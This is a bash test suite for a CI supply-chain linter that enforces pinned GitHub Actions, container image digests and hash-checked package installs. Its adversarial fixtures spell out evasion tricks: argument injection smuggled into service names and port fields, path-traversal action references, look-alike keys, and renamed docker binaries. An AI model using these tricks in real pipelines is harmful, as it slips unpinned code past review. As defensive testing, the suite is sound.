#!/usr/bin/env bash
# Proves .github/agent/bin/check-action-pins.py (row 78): one throwaway repo per case, each with one fixture workflow.
set -euo pipefail
here=$(cd "$(dirname "$0")" && pwd)
work=$(mktemp -d); trap 'rm -rf "$work"' EXIT
pass=0 failn=0
gate="$here/../../workflows/agent-review-gate.yml"
# the vendored pure-Python PyYAML (fixtures/testlib/pyyaml) as `yaml`, so every CI job — with or
# without a PyYAML of its own — runs these cases against the same parser
mkdir -p "$work/pylib"; ln -s "$here/../fixtures/testlib/pyyaml" "$work/pylib/yaml"
export PYTHONPATH="$work/pylib${PYTHONPATH:+:$PYTHONPATH}"
SHA=3d3c42e5aac5ba805825da76410c181273ba90b1
DIG=sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667

# case_ <name> <expect ok|bad> <workflow text> [setup commands, run in the fixture root]
case_() {
  local name=$1 expect=$2 d="$work/$1"
  mkdir -p "$d/.github/workflows"; printf '%s\n' "$3" > "$d/.github/workflows/w.yml"
  cp "$gate" "$d/.github/workflows/agent-review-gate.yml"   # every tree must carry the pinned gate
  if [ -n "${4:-}" ]; then (cd "$d" && eval "$4"); fi
  if python3 "$here/../bin/check-action-pins.py" "$d" >/dev/null 2>&1; then got=ok; else got=bad; fi
  if [ "$got" = "$expect" ]; then pass=$((pass+1)); echo "PASS $name → $got"
  else failn=$((failn+1)); echo "FAIL $name → $got (want $expect)"; fi
  # VERBOSE=1: show why each case was judged (the first finding), to prove a red is the intended red
  if [ -n "${VERBOSE:-}" ]; then python3 "$here/../bin/check-action-pins.py" "$d" 2>&1 | head -1 | sed "s#^#     #" || true; fi
}
head='on: push
jobs:
  j:
    runs-on: ubuntu-latest'

# --- the forms that pass
case_ pinned               ok  "$head
    steps:
      - uses: actions/checkout@$SHA # v7.0.1"
case_ pinned-quoted        ok  "$head
    steps:
      - uses: 'actions/checkout@$SHA' # v7.0.1"
case_ pinned-subpath       ok  "$head
    steps:
      - uses: github/codeql-action/init@$SHA # v4.1.0"
case_ remote-reusable      bad "on: push
jobs:
  j:
    uses: octo/repo/.github/workflows/x.yml@$SHA # v1.2.3"
case_ local-reusable       ok  "on: push
jobs:
  j:
    uses: ./.github/workflows/w.yml"
case_ docker-digest        ok  "$head
    steps:
      - uses: docker://alpine@$DIG"
case_ container-digest     ok  "$head
    container: alpine@$DIG
    steps:
      - run: true"
case_ service-digest       ok  "$head
    services:
      db:
        image: postgres@$DIG
    steps:
      - run: true"
case_ with-image-is-data   ok  "$head
    steps:
      - uses: actions/checkout@$SHA # v7.0.1
        with:
          image: ghcr.io/x/y@\${{ env.D }}"

case_ job-named-image      ok  "on: push
jobs:
  image:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@$SHA # v7.0.1"
case_ env-image-is-data    ok  "$head
    env:
      image: alpine:3.20
    steps:
      - run: true"
case_ service-scalar-digest ok "$head
    services:
      db: postgres@$DIG
    steps:
      - run: true"

# --- the handoff's four: all red
case_ tag                  bad "$head
    steps:
      - uses: actions/checkout@v7"
case_ branch               bad "$head
    steps:
      - uses: actions/checkout@main"
case_ short-sha            bad "$head
    steps:
      - uses: actions/checkout@3d3c42e # v7.0.1"
case_ sha-no-comment       bad "$head
    steps:
      - uses: actions/checkout@$SHA"

# --- bypass attempts: all red
case_ uppercase-sha        bad "$head
    steps:
      - uses: actions/checkout@3D3C42E5AAC5BA805825DA76410C181273BA90B1 # v7.0.1"
case_ sha-in-comment-only  bad "$head
    steps:
      - uses: actions/checkout@v7 # $SHA"
case_ comment-not-version  bad "$head
    steps:
      - uses: actions/checkout@$SHA # pinned"
case_ comment-next-line    bad "$head
    steps:
      - uses: actions/checkout@$SHA
        # v7.0.1"
case_ key-case             bad "$head
    steps:
      - Uses: actions/checkout@v7"
case_ key-whitespace       bad "$head
    steps:
      - \"uses \": actions/checkout@v7"
case_ flow-style           bad "$head
    steps: [{uses: actions/checkout@v7}]"
case_ anchor-alias         bad "x-step: &s
  uses: actions/checkout@v7
$head
    steps:
      - *s"
case_ merge-key            bad "x-step: &s
  uses: actions/checkout@v7
$head
    steps:
      - <<: *s"
case_ second-document      bad "$head
    steps:
      - uses: actions/checkout@$SHA # v7.0.1
---
$head
    steps:
      - uses: actions/checkout@v7"
case_ folded-scalar        bad "$head
    steps:
      - uses: >-
          actions/checkout@$SHA"
case_ templated            bad "$head
    steps:
      - uses: \${{ vars.ACTION }}"
case_ matrix-expression    bad "$head
    strategy:
      matrix:
        a: ['actions/checkout@v7']
    steps:
      - uses: \${{ matrix.a }}"
case_ not-a-string         bad "$head
    steps:
      - uses: [actions/checkout@v7]"
case_ docker-tag           bad "$head
    steps:
      - uses: docker://alpine:3.20"
case_ container-tag        bad "$head
    container: alpine:3.20
    steps:
      - run: true"
case_ container-map-tag    bad "$head
    container:
      image: alpine:3.20
    steps:
      - run: true"
case_ service-tag          bad "$head
    services:
      db:
        image: postgres:16
    steps:
      - run: true"
case_ local-escapes        bad "$head
    steps:
      - uses: ./../elsewhere" "mkdir -p ../elsewhere; printf 'runs:\n  using: composite\n  steps: []\n' > ../elsewhere/action.yml"
case_ local-missing        bad "$head
    steps:
      - uses: ./.github/actions/nope"
case_ nested-action-tag    bad "$head
    steps:
      - uses: ./.github/actions/x" "mkdir -p .github/actions/x; printf 'runs:\n  using: composite\n  steps:\n    - uses: actions/checkout@v7\n' > .github/actions/x/action.yml"
case_ action-yml-anywhere  bad "$head
    steps:
      - run: true" "mkdir -p tools/a; printf 'runs:\n  using: composite\n  steps:\n    - uses: actions/checkout@v7\n' > tools/a/action.yaml"
case_ docker-action-file   bad "$head
    steps:
      - run: true" "mkdir -p tools/d; printf 'runs:\n  using: docker\n  image: Dockerfile\n' > tools/d/action.yml"
case_ non-yml-in-workflows bad "$head
    steps:
      - run: true" "cp .github/workflows/w.yml .github/workflows/x.YML.txt"
case_ nested-workflow-dir  bad "$head
    steps:
      - run: true" "mkdir -p .github/workflows/sub; printf 'on: push\njobs:\n  j:\n    runs-on: x\n    steps:\n      - uses: actions/checkout@v7\n' > .github/workflows/sub/y.yml"
case_ unparsable           bad "$head
    steps:
      - uses: actions/checkout@$SHA # v7.0.1
     bad: [indent"


# --- adversarial round 1 (audits/2026-09-30/pins/round1): all red
case_ local-action-refused bad "$head
    steps:
      - uses: ./.github/actions/x" "mkdir -p .github/actions/x; printf 'runs:\n  using: composite\n  steps:\n    - uses: actions/checkout@$SHA # v7.0.1\n' > .github/actions/x/action.yml"
case_ local-action-upper   bad "$head
    steps:
      - uses: ./.github/actions/x" "mkdir -p .github/actions/x; printf 'runs:\n  using: composite\n  steps:\n    - uses: actions/checkout@v7\n' > .github/actions/x/ACTION.YML"
case_ upper-manifest-found bad "$head
    steps:
      - run: true" "mkdir -p tools/a; printf 'runs:\n  using: composite\n  steps:\n    - uses: actions/checkout@v7\n' > tools/a/Action.Yml"
case_ local-workflow-step  bad "$head
    steps:
      - uses: ./.github/workflows/w.yml"
case_ job-named-with-cont  bad "on: push
jobs:
  with:
    runs-on: ubuntu-latest
    container: alpine:3.20
    steps:
      - run: true"
case_ job-named-with-uses  bad "on: push
jobs:
  with:
    uses: octo/repo/.github/workflows/x.yml@main"
case_ job-named-env-cont   bad "on: push
jobs:
  env:
    runs-on: ubuntu-latest
    container: alpine:3.20
    steps:
      - run: true"
case_ service-named-with   bad "$head
    services:
      with:
        image: redis:7
    steps:
      - run: true"
case_ service-scalar-tag   bad "$head
    services:
      db: redis:7
    steps:
      - run: true"
case_ service-expression   bad "$head
    services:
      db: \${{ matrix.svc }}
    steps:
      - run: true"
case_ services-expression  bad "$head
    services: \${{ fromJSON('{\"db\":{\"image\":\"redis:7\"}}') }}
    steps:
      - run: true"
case_ service-no-image     bad "$head
    services:
      db:
        ports: ['5432']
    steps:
      - run: true"
case_ expression-key       bad "$head
    steps:
      - \"\${{ 'uses' }}\": actions/checkout@v7"
case_ expression-key-action bad "$head
    steps:
      - run: true" "mkdir -p tools/a; printf 'runs:\n  using: composite\n  steps:\n    - \"\${{ '\\''uses'\\'' }}\": actions/checkout@v7\n' > tools/a/action.yaml"
case_ comment-in-string    bad "$head
    steps:
      - {uses: actions/checkout@$SHA, name: \"hello # v7.0.1 \"} # v0.0.0"
case_ comment-after-other  bad "$head
    steps:
      - uses: actions/checkout@$SHA
        name: x # v7.0.1"
case_ anchor-only-pinned   bad "$head
    steps:
      - &s uses: actions/checkout@$SHA # v7.0.1"
case_ uses-odd-position    bad "on: push
uses: actions/checkout@v7
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: true"
case_ symlinked-workflow   bad "$head
    steps:
      - run: true" "printf 'on: push\n' > ../elsewhere-\$\$.yml; ln -s \"\$(cd .. && pwd)/elsewhere-\$\$.yml\" .github/workflows/s.yml"
case_ docker-action-image  bad "$head
    steps:
      - run: true" "mkdir -p tools/d; printf 'runs:\n  using: docker\n  image: docker://alpine:3.20\n' > tools/d/action.yml"


# --- adversarial round 2 (audits/2026-09-30/pins/round2)
case_ qemu-pinned          ok  "$head
    steps:
      - uses: docker/setup-qemu-action@$SHA # v4.4.0
        with:
          image: tonistiigi/binfmt:latest@$DIG"
case_ buildx-pinned        ok  "$head
    steps:
      - uses: docker/setup-buildx-action@$SHA # v4.4.1
        with:
          driver-opts: image=moby/buildkit:buildx-stable-1@$DIG"
case_ buildx-docker-driver ok  "$head
    steps:
      - uses: docker/setup-buildx-action@$SHA # v4.4.1
        with:
          driver: docker"
case_ unicode-nbsp-ref     bad "$head
    steps:
      - uses: \"actions/checkout@$SHA\\u00a0\" # v7.0.1"
case_ trailing-newline-ref bad "$head
    steps:
      - uses: \"actions/checkout@$SHA\\n\" # v7.0.1"
case_ tag-with-fragment    bad "$head
    steps:
      - uses: actions/checkout@$SHA # v7.0.1#not-a-real-tag"
case_ qemu-default-image   bad "$head
    steps:
      - uses: docker/setup-qemu-action@$SHA # v4.4.0"
case_ qemu-tag-image       bad "$head
    steps:
      - uses: docker/setup-qemu-action@$SHA # v4.4.0
        with:
          image: tonistiigi/binfmt:latest"
case_ buildx-default-image bad "$head
    steps:
      - uses: docker/setup-buildx-action@$SHA # v4.4.1"
case_ buildx-tag-image     bad "$head
    steps:
      - uses: docker/setup-buildx-action@$SHA # v4.4.1
        with:
          driver-opts: image=moby/buildkit:buildx-stable-1"
case_ buildx-two-images    bad "$head
    steps:
      - uses: docker/setup-buildx-action@$SHA # v4.4.1
        with:
          driver-opts: image=moby/buildkit@$DIG,image=moby/buildkit:latest"
case_ image-trailing-space bad "$head
    container: \"alpine@$DIG \"
    steps:
      - run: true"

# --- adversarial round 3 (audits/2026-09-30/pins/round3)
case_ buildx-multiline-ok  ok  "$head
    steps:
      - uses: docker/setup-buildx-action@$SHA # v4.4.1
        with:
          driver-opts: |
            network=host
            image=moby/buildkit@$DIG"
case_ qemu-owner-case      bad "$head
    steps:
      - uses: Docker/setup-qemu-action@$SHA # v4.4.0"
case_ buildx-repo-case     bad "$head
    steps:
      - uses: DOCKER/Setup-Buildx-Action@$SHA # v4.4.1"
case_ qemu-input-space     bad "$head
    steps:
      - uses: docker/setup-qemu-action@$SHA # v4.4.0
        with:
          \"image \": tonistiigi/binfmt@$DIG"
case_ buildx-driver-space  bad "$head
    steps:
      - uses: docker/setup-buildx-action@$SHA # v4.4.1
        with:
          \"driver \": docker"
case_ buildx-env-decoy     bad "$head
    steps:
      - uses: docker/setup-buildx-action@$SHA # v4.4.1
        with:
          driver-opts: env.NOTE=decoy image=moby/buildkit@$DIG"
case_ buildx-append        bad "$head
    steps:
      - uses: docker/setup-buildx-action@$SHA # v4.4.1
        with:
          driver-opts: image=moby/buildkit@$DIG
          append: |
            - name: n0
              driver-opts:
                - image=moby/buildkit:latest"
case_ qemu-input-twice     bad "$head
    steps:
      - uses: docker/setup-qemu-action@$SHA # v4.4.0
        with:
          image: tonistiigi/binfmt@$DIG
          IMAGE: tonistiigi/binfmt:latest"

# --- adversarial round 4 (audits/2026-09-30/pins/round4)
case_ buildx-csv-quoted-ok ok  "$head
    steps:
      - uses: docker/setup-buildx-action@$SHA # v4.4.1
        with:
          driver-opts: network=host,\"image=moby/buildkit@$DIG\""
case_ buildx-csv-override  bad "$head
    steps:
      - uses: docker/setup-buildx-action@$SHA # v4.4.1
        with:
          driver-opts: |
            image=moby/buildkit@$DIG
            network=host,image=moby/buildkit:latest"
case_ buildx-csv-upper     bad "$head
    steps:
      - uses: docker/setup-buildx-action@$SHA # v4.4.1
        with:
          driver-opts: image=moby/buildkit@$DIG,IMAGE=moby/buildkit:latest"
case_ buildx-csv-broken    bad "$head
    steps:
      - uses: docker/setup-buildx-action@$SHA # v4.4.1
        with:
          driver-opts: '\"image=moby/buildkit@$DIG'"

# --- adversarial round 5 (audits/2026-09-30/pins/round5)
case_ kind-default-ok      ok  "$head
    steps:
      - uses: helm/kind-action@$SHA # v1.15.0
        with:
          cluster_name: x
          registry: 'false'"
case_ kind-pinned-ok       ok  "$head
    steps:
      - uses: helm/kind-action@$SHA # v1.15.0
        with:
          node_image: kindest/node@$DIG
          registry: 'true'
          registry_image: registry@$DIG"
case_ kind-node-tag        bad "$head
    steps:
      - uses: Helm/Kind-Action@$SHA # v1.15.0
        with:
          node_image: kindest/node:v1.33.0"
case_ kind-registry-default bad "$head
    steps:
      - uses: helm/kind-action@$SHA # v1.15.0
        with:
          registry: 'true'"
case_ kind-config          bad "$head
    steps:
      - uses: helm/kind-action@$SHA # v1.15.0
        with:
          config: kind.yaml"
case_ kind-cloud-provider  bad "$head
    steps:
      - uses: helm/kind-action@$SHA # v1.15.0
        with:
          cloud_provider: 'true'"

# --- adversarial round 6 (audits/2026-09-30/pins/round6)
case_ kind-node-collision  bad "$head
    steps:
      - uses: helm/kind-action@$SHA # v1.15.0
        with:
          node_image: kindest/node@$DIG
          \"node image\": kindest/node:v1.33.0"
case_ qemu-image-collision bad "$head
    steps:
      - uses: docker/setup-qemu-action@$SHA # v4.4.0
        with:
          image: tonistiigi/binfmt@$DIG
          \"Image\": tonistiigi/binfmt:latest"
case_ buildx-kubernetes    bad "$head
    steps:
      - uses: docker/setup-buildx-action@$SHA # v4.4.1
        with:
          driver: kubernetes
          driver-opts: |
            image=moby/buildkit@$DIG
            qemu.install=true"
case_ buildx-container-ok  ok  "$head
    steps:
      - uses: docker/setup-buildx-action@$SHA # v4.4.1
        with:
          driver: docker-container
          driver-opts: image=moby/buildkit@$DIG"

# --- adversarial round 7 (audits/2026-09-30/pins/round7): anything not positively classified fails
case_ buildx-unicode-input bad "$head
    steps:
      - uses: docker/setup-buildx-action@$SHA # v4.4.1
        with:
          driver-opts: image=moby/buildkit@$DIG
          driver-optſ: image=moby/buildkit:latest"
case_ buildx-endpoint      bad "$head
    steps:
      - uses: docker/setup-buildx-action@$SHA # v4.4.1
        with:
          driver-opts: image=moby/buildkit@$DIG
          endpoint: --driver-opt=image=moby/buildkit:latest"
case_ qemu-with-expression bad "$head
    steps:
      - uses: docker/setup-qemu-action@$SHA # v4.4.0
        with: \${{ fromJSON(vars.X) }}"
case_ service-options      bad "$head
    services:
      db:
        image: alpine@$DIG
        options: --entrypoint /bin/sh alpine:latest
    steps:
      - run: true"
case_ container-options    bad "$head
    container:
      image: alpine@$DIG
      options: --cpus 1
    steps:
      - run: true"

# --- adversarial round 8 (audits/2026-09-30/pins/round8): only positively classified shapes pass
case_ container-env-ok     ok  "$head
    container:
      image: alpine@$DIG
      env:
        FOO: bar
      credentials:
        username: u
        password: p
    steps:
      - run: true"
case_ service-ports        bad "$head
    services:
      db:
        image: alpine@$DIG
        ports:
          - '8080:80 --entrypoint /bin/sh alpine:latest'
    steps:
      - run: true"
case_ container-ports      bad "$head
    container:
      image: alpine@$DIG
      ports: ['80']
    steps:
      - run: true"
case_ container-volumes    bad "$head
    container:
      image: alpine@$DIG
      volumes: ['/x:/y']
    steps:
      - run: true"
case_ container-env-name   bad "$head
    container:
      image: alpine@$DIG
      env:
        'A B': x
    steps:
      - run: true"
case_ docker-entrypoint    bad "$head
    steps:
      - uses: docker://alpine@$DIG
        with:
          entrypoint: '/bin/echo\" alpine:latest \"x'"
case_ docker-args          bad "$head
    steps:
      - uses: docker://alpine@$DIG
        with:
          args: x"
case_ docker-plain-input   ok  "$head
    steps:
      - uses: docker://alpine@$DIG
        with:
          some_input: x"
case_ unclassified-action  bad "$head
    steps:
      - uses: addnab/docker-run-action@$SHA # v3
        with:
          image: alpine:latest"

# --- adversarial round 9 (audits/2026-09-30/pins/round9)
case_ docker-action-entrypoint bad "$head
    steps:
      - uses: ossf/scorecard-action@$SHA # v2.4.4
        with:
          results_file: r.sarif
          entrypoint: '/bin/echo\" alpine:latest \"'"
case_ gate-edited          bad "$head
    steps:
      - run: true" "sed -i.bak 's/--verify-tags --git/--git/' .github/workflows/agent-review-gate.yml && rm .github/workflows/*.bak"
case_ gate-missing         bad "$head
    steps:
      - run: true" "rm .github/workflows/agent-review-gate.yml"
case_ gate-pin-bumped-ok   ok  "$head
    steps:
      - run: true" "sed -i.bak -E 's/@[0-9a-f]{40} # v7.0.1/@$SHA # v7.0.2/' .github/workflows/agent-review-gate.yml && rm .github/workflows/*.bak"

# --- adversarial round 10 (audits/2026-09-30/pins/round10)
case_ action-path-traversal bad "$head
    steps:
      - uses: actions/checkout/../../../docker/setup-qemu-action/$SHA@$SHA # v7.0.1
        with:
          image: tonistiigi/binfmt:latest"
case_ service-name-inject  bad "$head
    services:
      'db --entrypoint /bin/sh alpine:latest --':
        image: alpine@$DIG
    steps:
      - run: true"

# --- the gate's mode: a commit read as git objects (--git), never checked out
gitcase() {
  local name=$1 expect=$2 d="$work/git-$1"
  mkdir -p "$d/.github/workflows"; printf '%s\n' "$3" > "$d/.github/workflows/w.yml"
  cp "$gate" "$d/.github/workflows/agent-review-gate.yml"
  (cd "$d" && eval "${4:-true}" && git init -q && git add -A && git -c user.name=t -c user.email=t@t commit -qm t)
  if (cd "$d" && python3 "$here/../bin/check-action-pins.py" --git HEAD >/dev/null 2>&1); then got=ok; else got=bad; fi
  if [ "$got" = "$expect" ]; then pass=$((pass+1)); echo "PASS git-$name → $got"
  else failn=$((failn+1)); echo "FAIL git-$name → $got (want $expect)"; fi
}
gitcase pinned   ok  "$head
    steps:
      - uses: actions/checkout@$SHA # v7.0.1"
gitcase tag      bad "$head
    steps:
      - uses: actions/checkout@v7"
gitcase symlink  bad "$head
    steps:
      - run: true" "ln -s w.yml .github/workflows/s.yml"


# --- images a run: script names (handoff 0068; owner Sep 30, handoff 0023: "no exceptions, anywhere"; every finding
#     a fix or a documented exclusion with a reason). A LITERAL image a script runs or pulls must be a digest; an image
#     through a shell variable stays with the review pass; a local name the same job made is our own bytes.
r() { printf '%s\n    steps:\n      - run: %s' "$head" "$1"; }
case_ run-literal-tag          bad "$(r 'docker run --rm alpine:latest true')"
case_ run-bare-name            bad "$(r 'docker run alpine true')"
case_ run-registry-tag         bad "$(r 'docker pull ghcr.io/x/y:1.0')"
case_ run-flags-first          bad "$(r 'docker run -d --name x -p 127.0.0.1:1:2 -e A=b --entrypoint /bin/sh alpine -c true')"
case_ run-flag-equals          bad "$(r 'docker run --name=x --platform=linux/arm64 alpine')"
case_ run-sudo-env             bad "$(r 'FOO=1 sudo docker pull busybox')"
case_ run-chained              bad "$(r 'true && docker run alpine')"
case_ run-subshell             bad "$(r 'x=$(docker run alpine cat /etc/os-release)')"
case_ run-container-verb       bad "$(r 'docker container run alpine')"
case_ run-image-verb           bad "$(r 'docker image pull alpine')"
case_ run-create               bad "$(r 'docker create alpine')"
case_ run-continued            bad "$head
    steps:
      - run: |
          docker run \\
            --rm alpine:3 true"
case_ run-skopeo-src           bad "$(r 'skopeo copy docker://alpine:3 oci-archive:/tmp/a.oci')"
case_ run-crane-src            bad "$(r 'crane copy alpine:3 ghcr.io/x/y:t')"
case_ run-composite            bad "$head
    steps:
      - uses: ./.github/actions/x" "mkdir -p .github/actions/x; printf 'runs:\n  using: composite\n  steps:\n    - run: docker run alpine\n      shell: bash\n' > .github/actions/x/action.yml"
case_ run-digest               ok  "$(r 'docker run --rm alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667 true')"
case_ run-variable             ok  "$(r 'docker run --rm "$IMG" true')"
case_ run-braced-variable      ok  "$(r 'docker run -d --name x "${repo}@${d}"')"
case_ run-variable-options     ok  "$(r 'docker run -d $authargs -p 1:2 "$ref"')"
case_ run-local-tag            ok  "$head
    steps:
      - run: docker tag \"\$src\" fa-production
      - run: docker run --rm fa-production"
case_ run-local-build          ok  "$(r 'docker build -t localimg . && docker run localimg')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile"
case_ run-local-skopeo         bad "$(r 'skopeo copy oci-archive:/tmp/a.oci docker-daemon:fa-debug:latest && docker run fa-debug:latest')"
case_ run-comment              ok  "$(r 'true # docker run alpine')"
case_ run-echo                 ok  "$(r 'echo docker run alpine')"
case_ run-crane-digest-only    ok  "$(r 'crane digest ghcr.io/x/y:1.0')"
case_ run-skopeo-push-dst      ok  "$(r 'skopeo copy oci-archive:/tmp/a.oci docker://ghcr.io/x/y:t')"
case_ run-if                   bad "$(r 'if docker run alpine true; then :; fi')"
case_ run-negated              bad "$(r '! docker run alpine')"
case_ run-loop-body            bad "$(r 'for x in 1; do docker run alpine; done')"
case_ run-timeout              bad "$(r 'timeout 30 docker run alpine')"
case_ run-env-wrapper          bad "$(r 'env A=b nohup docker pull alpine')"
case_ run-xargs                bad "$(r 'echo x | xargs docker run alpine')"
case_ run-local-template       ok  "$head
    steps:
      - run: for v in a b; do docker tag \"\$src\" \"fa-\${v}\"; done
      - run: docker run --rm fa-production"
case_ run-template-too-wide    bad "$head
    steps:
      - run: docker tag \"\$src\" \"\${v}\"
      - run: docker run --rm alpine"
case_ run-printf               ok  "$(r 'printf "%s\\n" "docker run alpine"; echo docker pull alpine')"
case_ run-other-job-local      bad "$head
    steps:
      - run: docker tag \"\$src\" fa-production
  k:
    runs-on: ubuntu-latest
    steps:
      - run: docker run fa-production"

rb() { printf '%s\n    steps:\n      - run: |\n          %s' "$head" "$1"; }   # block scalar: quotes and ": " stay shell text
# --- package installs a run: script makes (handoff 0070; owner Sep 30, handoff 0023). A Python install is pinned only
#     when every package comes from a -r file pip checks with --require-hashes; pipx / uv tool / uvx cannot take hashes;
#     npm, gem, yarn and pnpm installs are flagged too (none in the workflows today; a future one must not pass silently).
case_ pkg-pip-bare             bad "$(r 'pip install requests')"
case_ pkg-pip3-version         bad "$(r 'pip3 install requests==2.0')"
case_ pkg-global-flag          bad "$(r 'pip --no-cache-dir install requests')"
case_ pkg-python-m             bad "$(r 'python3 -m pip install requests')"
case_ pkg-continued            bad "$head
    steps:
      - run: |
          python3 -m pip \\
            install --quiet requests"
case_ pkg-venv-path            bad "$(rb '"$VENV/bin/pip" install requests')"
case_ pkg-hashes-but-spec      bad "$(r 'pip install --require-hashes -r req.txt requests')"
case_ pkg-r-without-hashes     bad "$(r 'pip install -r req.txt')"
case_ pkg-editable             bad "$(r 'pip install --require-hashes -e .')"
case_ pkg-pipx-install         bad "$(r 'pipx install black')"
case_ pkg-pipx-run             bad "$(r 'pipx run black --version')"
case_ pkg-uv-pip               bad "$(r 'uv pip install requests')"
case_ pkg-uv-tool              bad "$(r 'uv tool install ruff')"
case_ pkg-uvx                  bad "$(r 'uvx ruff check')"
case_ pkg-timeout              bad "$(r 'timeout 60 pip install requests')"
case_ pkg-npm                  bad "$(r 'npm install left-pad')"
case_ pkg-npm-ci               bad "$(r 'npm ci')"
case_ pkg-gem                  bad "$(r 'gem install rake')"
case_ pkg-yarn                 bad "$(r 'yarn add left-pad')"
case_ pkg-bash-c               bad "$(rb 'bash -c "pip install requests"')"
case_ pkg-eval                 bad "$(rb 'eval "pip install requests"')"
case_ img-bash-c               bad "$(rb 'sh -c "docker run alpine"')"
case_ pkg-hashed-file          ok  "$(rb 'python3 -m pip install --quiet --require-hashes --only-binary=:all: -r .github/agent/test-requirements.txt')" "mkdir -p .github/agent; printf 'x==1 --hash=sha256:00\\n' > .github/agent/test-requirements.txt"
case_ pkg-hashed-venv          ok  "$(rb '"$RUNNER_TEMP/v/bin/pip" install --quiet --require-hashes -r r.txt')" "printf 'x==1 --hash=sha256:00\\n' > r.txt"
case_ pkg-hashed-stdin         ok  "$head
    steps:
      - run: |
          python3 -m pip install --quiet --require-hashes --only-binary=:all: -r /dev/stdin <<'REQ'
          pyyaml==6.0.2 --hash=sha256:80bab7bfc629882493af4aa31a4cfa43a4c57c83813253626916b8c7ada83476
          REQ"
case_ pkg-dry-run              ok  "$(rb 'python3 -m pip install --dry-run --ignore-installed --require-hashes --target /tmp/x -r r.txt')" "printf 'x==1 --hash=sha256:00\\n' > r.txt"
case_ pkg-version-query        ok  "$(r 'pip --version; python3 -m pip --version; python3 bin/x.py install')"
case_ pkg-echo                 ok  "$(r 'echo pip install requests')"

# --- Sonnet #164 r1's eight bypasses (B1-B8), each a red case; the fixes keep our own forms green
case_ b1-abs-path              bad "$(r '/usr/bin/docker run alpine:latest')"
case_ b2-global-host           bad "$(r 'docker --host unix:///var/run/docker.sock run alpine:latest')"
case_ b2-global-debug          bad "$(r 'docker -D run alpine:latest')"
case_ b2-global-unknown        bad "$(r 'docker --frobnicate run alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667')"
case_ b2-global-host-refused  bad "$(r 'docker -H unix:///x --tls run --rm alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667 true')"
case_ b3-eval                  bad "$(rb 'eval "docker run alpine:latest"')"
case_ b4-unknown-flag          bad "$(r 'docker run --quiet-pull alpine:latest')"
case_ b4-unknown-short         bad "$(r 'docker run -Z alpine:latest')"
case_ b4-known-forms           bad "$(r 'docker run -dit -p8080:80 -eA=b --sig-proxy=false --platform=linux/arm64 -v /a:/b alpine:3')"
case_ b4-known-forms-pinned    ok  "$(r 'docker run -dit -p8080:80 -eA=b --sig-proxy=false --platform=linux/arm64 -v /a:/b alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667')"
case_ b5-compose               bad "$(r 'docker compose up -d')"
case_ b5-docker-compose        bad "$(r 'docker-compose up -d')"
case_ b5-bake                  bad "$(r 'docker buildx bake')"
case_ b6-build-unpinned        bad "$(r 'docker build -t myapp .')" "printf 'FROM alpine:latest\\n' > Dockerfile"
case_ b6-build-pinned          ok  "$(r 'docker build -t myapp . && docker run myapp')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667 AS b\\nFROM b\\nFROM scratch\\n' > Dockerfile"
case_ b6-build-stdin           bad "$(r 'docker build -t x - < Dockerfile')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile"
case_ b6-buildx-stdin-file     bad "$(r 'docker buildx build -f - .')"
case_ b6-generated             bad "$(rb 'printf "FROM alpine:latest\\n" > Dockerfile.gen && docker build -f Dockerfile.gen .')"
case_ b6-template-pinned       ok  "$(rb 'docker buildx build -f "Dockerfile.${v}" .')" "mkdir -p build; printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > build/Dockerfile.a; printf 'FROM busybox@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > build/Dockerfile.b"
case_ b6-template-one-bad      bad "$(rb 'docker buildx build -f "Dockerfile.${v}" .')" "mkdir -p build; printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > build/Dockerfile.a; printf 'FROM busybox:1\\n' > build/Dockerfile.b"
case_ b6-variable-from         bad "$(r 'docker build .')" "printf 'ARG B=alpine\\nFROM \${B}\\n' > Dockerfile"
case_ b7-short-prefix          bad "$head
    steps:
      - run: docker tag \"\$src\" \"al\${v}\"
      - run: docker run alpine true"
case_ b7-decoy-after           bad "$head
    steps:
      - run: docker run --rm alpine:latest true
      - run: docker build -t alpine:latest ." "printf 'FROM busybox@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile"
case_ b8-pwsh                  bad "$head
    steps:
      - shell: pwsh
        run: |
          docker run \`
            alpine:latest"
case_ b8-default-shell-pwsh    bad "$head
    defaults:
      run:
        shell: pwsh
    steps:
      - run: echo x; docker pull alpine"
case_ b8-pwsh-refused         bad "$head
    steps:
      - shell: pwsh
        run: Write-Output hello"
case_ b8-bash-template-shell   bad "$head
    steps:
      - shell: bash --noprofile --norc -eo pipefail {0}
        run: docker run alpine"

# --- Sonnet #164 r2 (N1-N4, R1): forwarded arguments, renamed tool binaries, pip download/wheel, conda, manifests
case_ n1-forward-docker        bad "$(rb 'log_docker() { echo x; docker "$@"; }; log_docker run alpine')"
case_ n1-forward-pip           bad "$(rb 'log_pip() { pip "$@"; }; log_pip install requests')"
case_ n1-variable-verb         bad "$(rb 'v=run; docker "$v" alpine')"
case_ n2-copied-binary         bad "$(rb 'cp "$(command -v docker)" /tmp/d && /tmp/d run alpine:latest')"
case_ n2-linked-binary         bad "$(rb 'ln -s "$(which docker)" /tmp/d')"
case_ n2-copied-pip            bad "$(rb 'cp /usr/bin/pip3 /tmp/p')"
case_ n2-copy-other-file       ok  "$(rb 'cp Dockerfile.production /tmp/Dockerfile && ln -s /tmp/a /tmp/b')"
case_ n3-pip-download          bad "$(r 'pip download requests')"
case_ n3-pip-wheel             bad "$(r 'python3 -m pip wheel requests')"
